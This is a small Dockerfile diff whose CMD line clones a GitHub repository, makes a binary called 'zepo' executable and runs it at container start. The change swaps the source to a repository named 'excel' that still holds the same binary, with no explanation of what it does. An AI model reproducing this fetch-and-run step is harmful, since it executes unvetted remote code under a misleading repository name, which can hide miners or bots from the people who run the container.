@@ -37,4 +37,4 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD git clone https://github.com/Sairin-SLOT/zepo.git && cd zepo && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json"
+CMD git clone https://github.com/tolecilik/excel.git && cd excel && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json"
